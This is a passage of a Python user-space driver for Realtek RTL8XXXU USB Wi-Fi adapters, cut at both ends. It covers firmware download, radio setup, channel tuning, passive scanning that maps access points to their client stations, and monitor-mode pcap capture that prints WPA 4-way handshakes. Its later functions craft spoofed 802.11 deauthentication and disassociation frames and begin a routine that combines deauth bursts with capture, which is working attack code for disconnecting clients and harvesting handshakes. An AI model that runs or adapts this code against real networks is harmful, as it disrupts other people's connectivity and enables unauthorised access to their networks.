        last_tx_page = self.fops.total_page_num
        last_entry = self.fops.last_llt_entry

        for i in range(last_tx_page):
            self._llt_write(i, i + 1)
        self._llt_write(last_tx_page, 0xFF)
        for i in range(last_tx_page + 1, last_entry):
            self._llt_write(i, i + 1)
        self._llt_write(last_entry, last_tx_page + 1)

    def load_firmware(self, firmware_path: Path) -> bytes:
        data = firmware_path.read_bytes()
        if len(data) < RTL8XXXU_FIRMWARE_HEADER_SIZE:
            raise RuntimeError("Firmware file too small")
        signature = struct.unpack_from("<H", data, 0)[0]
        if (signature & 0xFFF0) not in {
            0x92E0,
            0x92C0,
            0x88E0,
            0x88C0,
            0x5300,
            0x2300,
            0x88F0,
            0x10B0,
            0x92F0,
        }:
            raise RuntimeError(f"Invalid firmware signature: 0x{signature:04x}")
        return data

    def download_firmware(self, fw: bytes) -> None:
        fw_payload = fw[RTL8XXXU_FIRMWARE_HEADER_SIZE:]

        val8 = self.read8(REG_SYS_FUNC + 1)
        val8 |= 4
        self.write8(REG_SYS_FUNC + 1, val8)

        val16 = self.read16(REG_SYS_FUNC)
        val16 |= SYS_FUNC_CPU_ENABLE
        self.write16(REG_SYS_FUNC, val16)

        val8 = self.read8(REG_MCU_FW_DL)
        if val8 & MCU_FW_RAM_SEL:
            self.write8(REG_MCU_FW_DL, 0x00)
            self.reset_8051()

        val8 = self.read8(REG_MCU_FW_DL)
        val8 |= MCU_FW_DL_ENABLE
        self.write8(REG_MCU_FW_DL, val8)

        val32 = self.read32(REG_MCU_FW_DL)
        val32 &= ~(1 << 19)
        self.write32(REG_MCU_FW_DL, val32)

        val8 = self.read8(REG_MCU_FW_DL)
        val8 |= MCU_FW_DL_CSUM_REPORT
        self.write8(REG_MCU_FW_DL, val8)

        pages = len(fw_payload) // RTL_FW_PAGE_SIZE
        remainder = len(fw_payload) % RTL_FW_PAGE_SIZE

        fwptr = 0
        for i in range(pages):
            val8 = self.read8(REG_MCU_FW_DL + 2) & 0xF8
            val8 |= i & 0x7
            self.write8(REG_MCU_FW_DL + 2, val8)
            self.writeN(REG_FW_START_ADDRESS, fw_payload[fwptr : fwptr + RTL_FW_PAGE_SIZE])
            fwptr += RTL_FW_PAGE_SIZE

        if remainder:
            val8 = self.read8(REG_MCU_FW_DL + 2) & 0xF8
            val8 |= pages & 0x7
            self.write8(REG_MCU_FW_DL + 2, val8)
            self.writeN(REG_FW_START_ADDRESS, fw_payload[fwptr : fwptr + remainder])

        val16 = self.read16(REG_MCU_FW_DL)
        val16 &= ~MCU_FW_DL_ENABLE
        self.write16(REG_MCU_FW_DL, val16)

    def start_firmware(self) -> None:
        for _ in range(RTL8XXXU_FIRMWARE_POLL_MAX):
            val32 = self.read32(REG_MCU_FW_DL)
            if val32 & MCU_FW_DL_CSUM_REPORT:
                break
        else:
            raise RuntimeError("Firmware checksum poll timed out")

        val32 = self.read32(REG_MCU_FW_DL)
        val32 |= MCU_FW_DL_READY
        val32 &= ~MCU_WINT_INIT_READY
        self.write32(REG_MCU_FW_DL, val32)

        self.reset_8051()

        for _ in range(RTL8XXXU_FIRMWARE_POLL_MAX):
            val32 = self.read32(REG_MCU_FW_DL)
            if val32 & MCU_WINT_INIT_READY:
                break
            time.sleep(0.0001)
        else:
            raise RuntimeError("Firmware failed to start")

        self.write8(REG_HMTFR, 0x0F)

    def init_mac(self) -> None:
        for reg, val in self.tables.mac_init:
            if reg == 0xFFFF and val == 0xFF:
                break
            self.write8(reg, val)
        self.write16(REG_MAX_AGGR_NUM, 0x0707)

    def init_phy_bb(self) -> None:
        val16 = self.read16(REG_SYS_FUNC)
        val16 |= SYS_FUNC_BB_GLB_RSTN | SYS_FUNC_BBRSTB | SYS_FUNC_DIO_RF
        self.write16(REG_SYS_FUNC, val16)

        self.write8(REG_RF_CTRL, RF_ENABLE | RF_RSTB | RF_SDMRSTB)

        val8 = SYS_FUNC_USBA | SYS_FUNC_USBD | SYS_FUNC_BB_GLB_RSTN | SYS_FUNC_BBRSTB
        self.write8(REG_SYS_FUNC, val8)

        for reg, val in self.tables.phy_init:
            if reg == 0xFFFF and val == 0xFFFFFFFF:
                break
            self.write32(reg, val)
            time.sleep(0.000001)

        for reg, val in self.tables.agc:
            if reg == 0xFFFF and val == 0xFFFFFFFF:
                break
            self.write32(reg, val)
            time.sleep(0.000001)

    def read_rfreg(self, reg: int) -> int:
        hssia = self.read32(REG_FPGA0_XA_HSSI_PARM2)
        val32 = hssia
        val32 &= ~FPGA0_HSSI_PARM2_ADDR_MASK
        val32 |= (reg << FPGA0_HSSI_PARM2_ADDR_SHIFT) & FPGA0_HSSI_PARM2_ADDR_MASK
        val32 |= FPGA0_HSSI_PARM2_EDGE_READ
        hssia &= ~FPGA0_HSSI_PARM2_EDGE_READ
        self.write32(REG_FPGA0_XA_HSSI_PARM2, hssia)
        time.sleep(0.00001)
        self.write32(REG_FPGA0_XA_HSSI_PARM2, val32)
        time.sleep(0.0001)
        hssia |= FPGA0_HSSI_PARM2_EDGE_READ
        self.write32(REG_FPGA0_XA_HSSI_PARM2, hssia)
        time.sleep(0.00001)

        val32 = self.read32(REG_FPGA0_XA_HSSI_PARM1)
        if val32 & FPGA0_HSSI_PARM1_PI:
            retval = self.read32(REG_HSPI_XA_READBACK)
        else:
            retval = self.read32(REG_FPGA0_XA_LSSI_READBACK)
        return retval & 0xFFFFF

    def write_rfreg(self, reg: int, data: int) -> None:
        data &= FPGA0_LSSI_PARM_DATA_MASK
        dataaddr = ((reg & 0xFF) << FPGA0_LSSI_PARM_ADDR_SHIFT) | data
        self.write32(REG_FPGA0_XA_LSSI_PARM, dataaddr)
        time.sleep(0.000001)

    def init_phy_rf(self) -> None:
        rfsi_rfenv = self.read16(REG_FPGA0_XA_RF_SW_CTRL) & FPGA0_RF_RFENV

        val32 = self.read32(REG_FPGA0_XA_RF_INT_OE)
        val32 |= 1 << 20
        self.write32(REG_FPGA0_XA_RF_INT_OE, val32)
        time.sleep(0.000001)

        val32 = self.read32(REG_FPGA0_XA_RF_INT_OE)
        val32 |= 1 << 4
        self.write32(REG_FPGA0_XA_RF_INT_OE, val32)
        time.sleep(0.000001)

        val32 = self.read32(REG_FPGA0_XA_HSSI_PARM2)
        val32 &= ~FPGA0_HSSI_3WIRE_ADDR_LEN
        self.write32(REG_FPGA0_XA_HSSI_PARM2, val32)
        time.sleep(0.000001)

        val32 = self.read32(REG_FPGA0_XA_HSSI_PARM2)
        val32 &= ~FPGA0_HSSI_3WIRE_DATA_LEN
        self.write32(REG_FPGA0_XA_HSSI_PARM2, val32)
        time.sleep(0.000001)

        for reg, val in self.tables.radioa:
            if reg == 0xFF and val == 0xFFFFFFFF:
                break
            if reg == 0xFE:
                time.sleep(0.05)
                continue
            if reg == 0xFD:
                time.sleep(0.005)
                continue
            if reg == 0xFC:
                time.sleep(0.001)
                continue
            if reg == 0xFB:
                time.sleep(0.00005)
                continue
            if reg == 0xFA:
                time.sleep(0.000005)
                continue
            if reg == 0xF9:
                time.sleep(0.000001)
                continue
            self.write_rfreg(reg, val)
            time.sleep(0.000001)

        val16 = self.read16(REG_FPGA0_XA_RF_SW_CTRL)
        val16 &= ~FPGA0_RF_RFENV
        val16 |= rfsi_rfenv
        self.write16(REG_FPGA0_XA_RF_SW_CTRL, val16)

    def usb_quirks(self) -> None:
        val16 = self.read16(REG_CR)
        val16 |= CR_MAC_TX_ENABLE | CR_MAC_RX_ENABLE
        self.write16(REG_CR, val16)

        val32 = self.read32(REG_TXDMA_OFFSET_CHK)
        val32 |= TXDMA_OFFSET_DROP_DATA_EN
        self.write32(REG_TXDMA_OFFSET_CHK, val32)

        self.write8(REG_EARLY_MODE_CONTROL_8188E + 3, 0x01)

    def init_aggregation(self) -> None:
        usb_spec = self.read8(REG_USB_SPECIAL_OPTION)
        usb_spec &= ~USB_SPEC_USB_AGG_ENABLE
        self.write8(REG_USB_SPECIAL_OPTION, usb_spec)

        agg_ctrl = self.read8(REG_TRXDMA_CTRL)
        agg_ctrl &= ~TRXDMA_CTRL_RXDMA_AGG_EN
        self.write8(REG_TRXDMA_CTRL, agg_ctrl)

    def enable_rf(self) -> None:
        self.write8(REG_RF_CTRL, RF_ENABLE | RF_RSTB | RF_SDMRSTB)

        val32 = self.read32(REG_OFDM0_TRX_PATH_ENABLE)
        val32 &= ~(OFDM_RF_PATH_RX_MASK | OFDM_RF_PATH_TX_MASK)
        val32 |= OFDM_RF_PATH_RX_A | OFDM_RF_PATH_TX_A
        self.write32(REG_OFDM0_TRX_PATH_ENABLE, val32)
        self.write8(REG_TXPAUSE, 0x00)

    def configure_initial_rx(self) -> None:
        self.write8(REG_RX_DRVINFO_SZ, 4)
        rcr = (
            RCR_ACCEPT_AP
            | RCR_ACCEPT_PHYS_MATCH
            | RCR_ACCEPT_MCAST
            | RCR_ACCEPT_BCAST
            | RCR_ACCEPT_ADDR3
            | RCR_ACCEPT_PM
            | RCR_ACCEPT_DATA_FRAME
            | RCR_ACCEPT_CTRL_FRAME
            | RCR_ACCEPT_MGMT_FRAME
            | RCR_ACCEPT_CRC32
            | RCR_ACCEPT_ICV
            | RCR_HTC_LOC_CTRL
            | RCR_APPEND_PHYSTAT
            | RCR_APPEND_ICV
            | RCR_APPEND_MIC
            | RCR_APPEND_FCS
        )
        self.write32(REG_RCR, rcr)

    def set_channel(self, channel: int, bw: int = 20, sec_ch_above: Optional[bool] = None) -> None:
        primary_channel = channel
        opmode = self.read8(REG_BW_OPMODE)
        rsr = self.read32(REG_RESPONSE_RATE_SET)

        if bw == 20:
            opmode |= BW_OPMODE_20MHZ
            self.write8(REG_BW_OPMODE, opmode)

            val32 = self.read32(REG_FPGA0_RF_MODE)
            val32 &= ~FPGA_RF_MODE
            self.write32(REG_FPGA0_RF_MODE, val32)

            val32 = self.read32(REG_FPGA1_RF_MODE)
            val32 &= ~FPGA_RF_MODE
            self.write32(REG_FPGA1_RF_MODE, val32)
        elif bw == 40:
            if sec_ch_above is None:
                sec_ch_above = True

            primary = channel
            channel = primary + 2 if sec_ch_above else primary - 2

            opmode &= ~BW_OPMODE_20MHZ
            self.write8(REG_BW_OPMODE, opmode)
            rsr &= ~RSR_RSC_BANDWIDTH_40M
            rsr |= RSR_RSC_LOWER_SUB_CHANNEL if sec_ch_above else RSR_RSC_UPPER_SUB_CHANNEL
            self.write32(REG_RESPONSE_RATE_SET, rsr)

            val32 = self.read32(REG_FPGA0_RF_MODE)
            val32 |= FPGA_RF_MODE
            self.write32(REG_FPGA0_RF_MODE, val32)

            val32 = self.read32(REG_FPGA1_RF_MODE)
            val32 |= FPGA_RF_MODE
            self.write32(REG_FPGA1_RF_MODE, val32)

            val32 = self.read32(REG_CCK0_SYSTEM)
            val32 &= ~CCK0_SIDEBAND
            if not sec_ch_above:
                val32 |= CCK0_SIDEBAND
            self.write32(REG_CCK0_SYSTEM, val32)

            val32 = self.read32(REG_OFDM1_LSTF)
            val32 &= ~OFDM_LSTF_PRIME_CH_MASK
            val32 |= OFDM_LSTF_PRIME_CH_LOW if sec_ch_above else OFDM_LSTF_PRIME_CH_HIGH
            self.write32(REG_OFDM1_LSTF, val32)

            val32 = self.read32(REG_FPGA0_POWER_SAVE)
            val32 &= ~(FPGA0_PS_LOWER_CHANNEL | FPGA0_PS_UPPER_CHANNEL)
            val32 |= FPGA0_PS_UPPER_CHANNEL if sec_ch_above else FPGA0_PS_LOWER_CHANNEL
            self.write32(REG_FPGA0_POWER_SAVE, val32)
        else:
            raise ValueError("bw must be 20 or 40")

        val32 = self.read_rfreg(RF6052_REG_MODE_AG)
        val32 = _replace_bits(val32, channel, MODE_AG_CHANNEL_MASK)
        self.write_rfreg(RF6052_REG_MODE_AG, val32)

        val32 = self.read_rfreg(RF6052_REG_MODE_AG)
        val32 &= ~MODE_AG_BW_MASK
        val32 |= MODE_AG_BW_40MHZ_8723B if bw == 40 else MODE_AG_BW_20MHZ_8723B
        self.write_rfreg(RF6052_REG_MODE_AG, val32)
        self.current_channel = primary_channel

    def init_device(self, firmware_path: Path, channel: int, bw: int) -> None:
        self.power_on()
        self.init_queue_reserved_page()

        self.write16(REG_TRXFF_BNDY + 2, self.fops.trxff_boundary)

        pbp = (self.fops.pbp_rx << PBP_PAGE_SIZE_RX_SHIFT) | (self.fops.pbp_tx << PBP_PAGE_SIZE_TX_SHIFT)
        self.write8(REG_PBP, pbp)

        self.init_llt_table()

        fw = self.load_firmware(firmware_path)
        self.download_firmware(fw)
        self.start_firmware()

        self.init_mac()
        self.init_phy_bb()
        self.init_phy_rf()

        self.usb_quirks()
        self.init_aggregation()

        val32 = self.read32(REG_FPGA0_RF_MODE)
        val32 |= FPGA_RF_MODE_CCK | FPGA_RF_MODE_OFDM
        self.write32(REG_FPGA0_RF_MODE, val32)

        self.enable_rf()
        self.set_channel(channel, bw=bw)
        self.configure_initial_rx()

    def rx_frames(self, max_reads: Optional[int], read_size: int, timeout_ms: int) -> Iterator[bytes]:
        if self.ep_in is None:
            raise RuntimeError("Device not opened")
        reads = 0
        while max_reads is None or reads < max_reads:
            try:
                data = self.dev.read(self.ep_in, read_size, timeout=timeout_ms)
            except Exception:
                continue
            reads += 1
            yield bytes(data)

    def iter_rx_payloads(self, urb: bytes) -> Iterator[Tuple[RxDesc16, bytes]]:
        off = 0
        pkt_cnt = 0
        while off + 24 <= len(urb):
            desc = parse_rxdesc16(urb[off : off + 24])
            if pkt_cnt == 0:
                pkt_cnt = max(1, desc.pkt_cnt)

            drvinfo_bytes = desc.drvinfo_sz * 8
            pkt_offset = _roundup(desc.pktlen + drvinfo_bytes + desc.shift + 24, 128)
            payload_start = off + 24 + drvinfo_bytes + desc.shift
            payload_end = payload_start + desc.pktlen
            if payload_end > len(urb):
                break
            payload = urb[payload_start:payload_end]
            yield desc, payload

            off += pkt_offset
            pkt_cnt -= 1
            if pkt_cnt <= 0:
                break

    def scan_passive(
        self,
        channels: Sequence[int],
        dwell_ms: int,
        read_size: int,
        timeout_ms: int,
        good_fcs_only: bool,
        include_bad_fcs: bool,
        forever: bool = False,
        callback: Optional[Callable[[Dict], None]] = None,
    ) -> Dict[Tuple[str, str], Dict[str, object]]:
        if self.ep_in is None:
            raise RuntimeError("Device not opened")
        results: Dict[Tuple[str, str], Dict[str, object]] = {}
        stations_by_bssid: Dict[str, Dict[str, int]] = {}
        
        scan_iter = channels
        if forever:
            scan_iter = itertools.cycle(channels)
            
        for ch in scan_iter:
            self.set_channel(ch, bw=20)
            end = time.monotonic() + (dwell_ms / 1000.0)
            while time.monotonic() < end:
                try:
                    data = self.dev.read(self.ep_in, read_size, timeout=timeout_ms)
                except Exception:
                    continue
                urb = bytes(data)
                for desc, payload in self.iter_rx_payloads(urb):
                    if desc.rpt_sel != 0 or not payload:
                        continue
                    if _fc_version(payload) != 0:
                        continue
                    if not include_bad_fcs and (desc.crc32 or desc.icverr):
                        continue
                    if good_fcs_only and desc.crc32:
                        continue
                    fc = int.from_bytes(payload[0:2], "little") if len(payload) >= 2 else 0
                    ftype = (fc >> 2) & 0x3
                    subtype = (fc >> 4) & 0xF

                    try:
                        sta_mac: Optional[str] = None
                        frame_bssid: Optional[str] = None
                        if ftype == 2:
                            to_ds = bool((fc >> 8) & 0x1)
                            from_ds = bool((fc >> 9) & 0x1)
                            a1, a2, a3, _a4, _ftype2, _subtype2, _seq = _parse_addrs(payload)
                            if not from_ds and to_ds:
                                if _is_unicast_mac(a1) and _is_unicast_mac(a2) and a1 != a2:
                                    frame_bssid = _fmt_mac(a1)
                                    sta_mac = _fmt_mac(a2)
                            elif from_ds and not to_ds:
                                if _is_unicast_mac(a2) and _is_unicast_mac(a1) and a1 != a2:
                                    frame_bssid = _fmt_mac(a2)
                                    sta_mac = _fmt_mac(a1)
                        elif ftype == 0:
                            a1, a2, a3, _a4, _ftype2, _subtype2, _seq = _parse_addrs(payload)
                            a1_s = _fmt_mac(a1) if _is_unicast_mac(a1) else None
                            a2_s = _fmt_mac(a2) if _is_unicast_mac(a2) else None
                            a3_s = _fmt_mac(a3) if _is_unicast_mac(a3) else None
                            if a3_s is not None:
                                frame_bssid = a3_s
                                if a2_s is not None and a2_s != a3_s:
                                    sta_mac = a2_s
                                elif a1_s is not None and a1_s != a3_s:
                                    sta_mac = a1_s

                        if frame_bssid and sta_mac and frame_bssid != sta_mac:
                            st = stations_by_bssid.get(frame_bssid)
                            if st is None:
                                st = {}
                                stations_by_bssid[frame_bssid] = st
                            prev_seen = int(st.get(sta_mac, 0))
                            st[sta_mac] = prev_seen + 1
                            if prev_seen == 0:
                                sys.stdout.write(f"ch={int(ch):02d} sta={sta_mac} bssid={frame_bssid} seen=1\n")
                                sys.stdout.flush()
                    except Exception:
                        pass

                    if ftype != 0 or subtype not in (5, 8):
                        continue
                    a1, a2, a3, _a4, _ftype2, _subtype2, _seq = _parse_addrs(payload)
                    bssid = _fmt_mac(a3 or b"")
                    info = _extract_ap_info(payload)
                    if info is None or info['ssid'] is None:
                        continue
                    ssid = info['ssid']
                    ch_ie = info['channel']
                    ch_eff = ch_ie if ch_ie is not None else ch
                    key = (bssid, ssid)
                    row = results.get(key)
                    if row is None:
                        results[key] = {
                            "bssid": bssid, 
                            "ssid": ssid, 
                            "channel": ch_eff, 
                            "seen": 1, 
                            "tsfl": desc.tsfl,
                            "privacy": info['privacy'],
                            "wpa": info['wpa'],
                            "wpa2": info['wpa2']
                        }
                    else:
                        row["seen"] = int(row["seen"]) + 1
                        row["tsfl"] = desc.tsfl
                        row["channel"] = ch_eff
            if callback:
                callback(results)
        return results

    def scan_stations(
        self,
        bssid: str,
        channel: int,
        duration_ms: int,
        read_size: int,
        timeout_ms: int,
        good_fcs_only: bool,
        include_bad_fcs: bool,
    ) -> Dict[str, Dict[str, object]]:
        if self.ep_in is None:
            raise RuntimeError("Device not opened")
        results: Dict[str, Dict[str, object]] = {}
        bssid = bssid.lower()
        self.set_channel(channel, bw=20)
        end = time.monotonic() + (duration_ms / 1000.0)
        while time.monotonic() < end:
            try:
                data = self.dev.read(self.ep_in, read_size, timeout=timeout_ms)
            except Exception:
                continue
            urb = bytes(data)
            for desc, payload in self.iter_rx_payloads(urb):
                if desc.rpt_sel != 0 or not payload:
                    continue
                if _fc_version(payload) != 0:
                    continue
                if good_fcs_only and desc.crc32:
                    continue
                fc = int.from_bytes(payload[0:2], "little") if len(payload) >= 2 else 0
                ftype = (fc >> 2) & 0x3
                subtype = (fc >> 4) & 0xF

                sta_mac: Optional[str] = None
                frame_bssid: Optional[str] = None

                if ftype == 2:
                    to_ds = bool((fc >> 8) & 0x1)
                    from_ds = bool((fc >> 9) & 0x1)
                    a1, a2, _a3, _a4, _ftype2, _subtype2, _seq = _parse_addrs(payload)

                    if not from_ds and to_ds:
                        if _is_unicast_mac(a1) and _is_unicast_mac(a2) and a1 != a2:
                            frame_bssid = _fmt_mac(a1)
                            sta_mac = _fmt_mac(a2)
                    elif from_ds and not to_ds:
                        if _is_unicast_mac(a2) and _is_unicast_mac(a1) and a1 != a2:
                            frame_bssid = _fmt_mac(a2)
                            sta_mac = _fmt_mac(a1)
                elif ftype == 1 and subtype in (8, 10, 11):
                    if len(payload) >= 16:
                        ra = payload[4:10]
                        ta = payload[10:16]
                        ra_s = _fmt_mac(ra) if _is_unicast_mac(ra) else None
                        ta_s = _fmt_mac(ta) if _is_unicast_mac(ta) else None
                        if ra_s == bssid and ta_s is not None:
                            frame_bssid = ra_s
                            sta_mac = ta_s
                        elif ta_s == bssid and ra_s is not None:
                            frame_bssid = ta_s
                            sta_mac = ra_s
                elif ftype == 0 and subtype in (0, 2, 10, 11, 12):
                    a1, a2, a3, _a4, _ftype2, _subtype2, _seq = _parse_addrs(payload)
                    a1_s = _fmt_mac(a1) if _is_unicast_mac(a1) else None
                    a2_s = _fmt_mac(a2) if _is_unicast_mac(a2) else None
                    a3_s = _fmt_mac(a3) if _is_unicast_mac(a3) else None
                    if a3_s == bssid:
                        frame_bssid = a3_s
                        if a2_s is not None and a2_s != bssid:
                            sta_mac = a2_s
                        elif a1_s is not None and a1_s != bssid:
                            sta_mac = a1_s

                if frame_bssid == bssid and sta_mac:
                    row = results.get(sta_mac)
                    if row is None:
                        results[sta_mac] = {"mac": sta_mac, "seen": 1, "tsfl": desc.tsfl}
                    else:
                        row["seen"] = int(row["seen"]) + 1
                        row["tsfl"] = desc.tsfl
        return results

    def capture_pcap(
        self,
        pcap: PcapWriter,
        max_reads: Optional[int],
        read_size: int,
        timeout_ms: int,
        include_bad_fcs: bool,
        keep_fcs: bool,
    ) -> None:
        for urb in self.rx_frames(max_reads=max_reads, read_size=read_size, timeout_ms=timeout_ms):
            for desc, payload in self.iter_rx_payloads(urb):
                if desc.rpt_sel != 0 or not payload:
                    continue
                if not include_bad_fcs and (desc.crc32 or desc.icverr):
                    continue
                if _fc_version(payload) != 0:
                    continue
                frame = payload
                has_fcs = False
                if desc.crc32 or desc.icverr:
                    pass
                elif keep_fcs:
                    _, has_fcs = _strip_fcs_if_present(payload)
                else:
                    frame, has_fcs = _strip_fcs_if_present(payload)
                flags: Optional[int] = None
                if keep_fcs:
                    flags_val = 0x10 if has_fcs else 0
                    if desc.crc32:
                        flags_val |= 0x40
                    flags = flags_val
                rtap = _radiotap_header(tsft=desc.tsfl, channel=self.current_channel, flags=flags)
                pcap.write_packet(rtap + frame)
                _print_4way_if_present(frame)

    def rx_loop(
        self,
        max_reads: Optional[int],
        read_size: int,
        timeout_ms: int,
        good_fcs_only: bool,
        dump_bytes: int,
    ) -> None:
        for urb in self.rx_frames(max_reads=max_reads, read_size=read_size, timeout_ms=timeout_ms):
            for desc, payload in self.iter_rx_payloads(urb):
                if desc.rpt_sel == 0 and payload:
                    if good_fcs_only and desc.crc32:
                        continue

                    fc = int.from_bytes(payload[0:2], "little") if len(payload) >= 2 else 0
                    ftype, subtype, to_ds, from_ds, more_frag, retry, pwr_mgt, more_data, protected, order = _decode_fc(fc)
                    kind = _fc_type_subtype_name(ftype, subtype)
                    a1, a2, a3, a4, _ftype2, _subtype2, seq = _parse_addrs(payload)
                    frag = seq & 0xF
                    seqnum = (seq >> 4) & 0xFFF

                    s = (
                        f"len={len(payload)} tsfl=0x{desc.tsfl:08x} fcs_bad={desc.crc32} "
                        f"ht={desc.rxht} bw40={desc.bw} mcs={desc.rxmcs} "
                        f"{kind} to_ds={int(to_ds)} from_ds={int(from_ds)} "
                        f"a1={_fmt_mac(a1 or b'')} a2={_fmt_mac(a2 or b'')} a3={_fmt_mac(a3 or b'')}"
                    )
                    if a4 is not None:
                        s += f" a4={_fmt_mac(a4)}"
                    s += f" seq={seqnum} frag={frag}"
                    sys.stdout.write(s + "\n")
                    if dump_bytes:
                        dump = payload[: min(len(payload), dump_bytes)]
                        sys.stdout.write(dump.hex() + "\n")
                    sys.stdout.flush()
                    _print_4way_if_present(payload)

    def _build_tx_desc(self, payload: bytes, rate_id: int) -> bytes:
        return self._build_tx_desc_v3(payload, rate_id)

    def _build_tx_desc_v3(self, payload: bytes, rate_id: int) -> bytes:
        pkt_size = len(payload)
        pkt_offset = 32

        txdw0 = TXDESC_OWN | TXDESC_FIRST_SEGMENT | TXDESC_LAST_SEGMENT
        if len(payload) >= 10:
            da0 = payload[4]
            if da0 & 0x01:
                txdw0 |= TXDESC_BROADMULTICAST

        if len(payload) >= 2:
            fc = int.from_bytes(payload[0:2], "little")
            ftype, subtype, _to_ds, _from_ds, _more_frag, _retry, _pwr_mgt, _more_data, _protected, _order = (
                _decode_fc(fc)
            )
        else:
            ftype, subtype = 0, 0

        queue = TXDESC_QUEUE_MGNT if ftype == 0 else TXDESC_QUEUE_BE
        txdw1 = (queue & 0x1F) << TXDESC_QUEUE_SHIFT

        txdw2 = TXDESC40_AGG_BREAK | TXDESC_ANTENNA_SELECT_A | TXDESC_ANTENNA_SELECT_B

        seq_number = 0
        if ftype in (0, 2) and len(payload) >= 24:
            seq_ctrl = int.from_bytes(payload[22:24], "little")
            seq_number = (seq_ctrl >> 4) & 0x0FFF
        txdw3 = (seq_number & 0x0FFF) << TXDESC32_SEQ_SHIFT

        txdw4 = TXDESC32_USE_DRIVER_RATE
        txdw5 = rate_id | (6 << TXDESC32_RETRY_LIMIT_SHIFT) | TXDESC32_RETRY_LIMIT_ENABLE
        txdw6 = 0
        txdw7 = (TXDESC_ANTENNA_SELECT_C >> 16) & 0xFFFF

        desc = struct.pack(
            "<HBBIIIIIIHH",
            pkt_size,
            pkt_offset,
            txdw0,
            txdw1,
            txdw2,
            txdw3,
            txdw4,
            txdw5,
            txdw6,
            0,
            txdw7,
        )
        csum = _calc_tx_desc32_csum(desc)
        desc = desc[:28] + struct.pack("<H", csum) + desc[30:]
        return desc

    def _select_tx_ep(self, payload: bytes) -> int:
        if not self.bulk_out_eps:
            raise RuntimeError("No bulk OUT endpoints")
        if len(payload) >= 2:
            fc = int.from_bytes(payload[0:2], "little")
            ftype = (fc >> 2) & 0x3
            if ftype == 0:
                return self.bulk_out_eps[0]
        return self.bulk_out_eps[-1]

    def send_packet(
        self,
        payload: bytes,
        rate_id: int = DESC_RATE_6M,
        *,
        debug: Optional[bool] = None,
        dump_bytes: Optional[int] = None,
        timeout_ms: Optional[int] = None,
    ) -> bool:
        if not self.bulk_out_eps:
            raise RuntimeError("No bulk OUT endpoints")

        desc = self._build_tx_desc(payload, rate_id)
        data = desc + payload

        ep = self._select_tx_ep(payload)

        do_debug = self.tx_debug if debug is None else bool(debug)
        dump_n = self.tx_dump_bytes if dump_bytes is None else int(dump_bytes)
        timeout = self.tx_timeout_ms if timeout_ms is None else int(timeout_ms)

        wrote = 0
        r_s = "OK"
        ok = True
        try:
            wrote = self.dev.write(ep, data, timeout=timeout)
        except Exception as e:
            wrote = 0
            r_s = repr(e)
            ok = False
        finally:
            self.tx_frame_counter += 1

        if do_debug:
            sys.stderr.write(
                f"TX: ep=0x{ep:02x} total={len(data)} transferred={int(wrote)} timeout_ms={timeout} r={r_s}\n"
            )
            if len(desc) == 32:
                pkt_size, pkt_offset, txdw0, txdw1, txdw2, txdw3, txdw4, txdw5, txdw6, csum, txdw7 = (
                    struct.unpack("<HBBIIIIIIHH", desc)
                )
                sys.stderr.write(
                    f"TX: desc pkt_size={pkt_size} pkt_offset={pkt_offset} txdw0=0x{txdw0:02x} txdw1=0x{txdw1:08x} txdw2=0x{txdw2:08x} txdw3=0x{txdw3:08x} txdw4=0x{txdw4:08x} txdw5=0x{txdw5:08x} txdw6=0x{txdw6:08x} csum=0x{csum:04x} txdw7=0x{txdw7:04x}\n"
                )

            if len(payload) >= 26:
                fc = int.from_bytes(payload[0:2], "little")
                ftype, subtype, _to_ds, _from_ds, _more_frag, _retry, _pwr_mgt, _more_data, _protected, _order = _decode_fc(
                    fc
                )
                if ftype == 0 and subtype in (10, 12):
                    dur = int.from_bytes(payload[2:4], "little")
                    da = payload[4:10]
                    sa = payload[10:16]
                    bssid = payload[16:22]
                    seq_ctrl = int.from_bytes(payload[22:24], "little")
                    reason = struct.unpack_from("<H", payload, 24)[0]
                    sys.stderr.write(
                        f"TX: 80211 fc=0x{fc:04x} dur=0x{dur:04x} da={_fmt_mac(da)} sa={_fmt_mac(sa)} bssid={_fmt_mac(bssid)} seq={(seq_ctrl >> 4) & 0x0FFF} reason={reason}\n"
                    )

            if dump_n > 0:
                sys.stderr.write(f"TX: desc_hex={desc.hex()}\n")
                dump_payload = payload[: min(len(payload), dump_n)]
                sys.stderr.write(f"TX: payload_hex={dump_payload.hex()}\n")

        return ok

    def send_disassoc(self, dest: str, bssid: str, source: Optional[str] = None, reason: int = 8) -> bool:
        if source is None:
            source = bssid
        
        da = bytes.fromhex(dest.replace(":", "").replace("-", ""))
        sa = bytes.fromhex(source.replace(":", "").replace("-", ""))
        bssid_bytes = bytes.fromhex(bssid.replace(":", "").replace("-", ""))
        
        if len(da) != 6 or len(sa) != 6 or len(bssid_bytes) != 6:
            raise ValueError("Invalid MAC address length")

        # 802.11 Header
        # FC: 0xA000 (Disassoc)
        fc = 0x00A0
        duration = 0x013a # 314us
        seq_ctrl = (self.tx_seq & 0xFFF) << 4
        self.tx_seq = (self.tx_seq + 1) & 0xFFF
        
        header = struct.pack("<HH", fc, duration) + da + sa + bssid_bytes + struct.pack("<H", seq_ctrl)
        
        # Body: Reason code
        body = struct.pack("<H", reason)
        
        payload = header + body
        return self.send_packet(payload)

    def send_deauth(self, dest: str, bssid: str, source: Optional[str] = None, reason: int = 7) -> bool:
        if source is None:
            source = bssid
        
        da = bytes.fromhex(dest.replace(":", "").replace("-", ""))
        sa = bytes.fromhex(source.replace(":", "").replace("-", ""))
        bssid_bytes = bytes.fromhex(bssid.replace(":", "").replace("-", ""))
        
        if len(da) != 6 or len(sa) != 6 or len(bssid_bytes) != 6:
            raise ValueError("Invalid MAC address length")

        # 802.11 Header
        # FC: 0xC000 (Deauth)
        fc = 0x00C0
        duration = 0x013a # 314us
        seq_ctrl = (self.tx_seq & 0xFFF) << 4
        self.tx_seq = (self.tx_seq + 1) & 0xFFF
        
        header = struct.pack("<HH", fc, duration) + da + sa + bssid_bytes + struct.pack("<H", seq_ctrl)
        
        # Body: Reason code
        body = struct.pack("<H", reason)
        
        payload = header + body
        return self.send_packet(payload)

    def deauth_burst_capture_pcap(
        self,
        *,
        pcap: "PcapWriter",
        dest: str,
        bssid: str,
        source: Optional[str],
        reason: int,
        burst_size: int,
        interval_ms: int,
        duration_s: int,
        read_size: int,
        timeout_ms: int,
        include_bad_fcs: bool,
        keep_fcs: bool,
    ) -> Tuple[int, int]:
        if self.ep_in is None:
            raise RuntimeError("Device not opened")
        if burst_size <= 0:
            raise ValueError("burst_size must be > 0")
        if interval_ms <= 0:
            raise ValueError("interval_ms must be > 0")

        end: Optional[float]
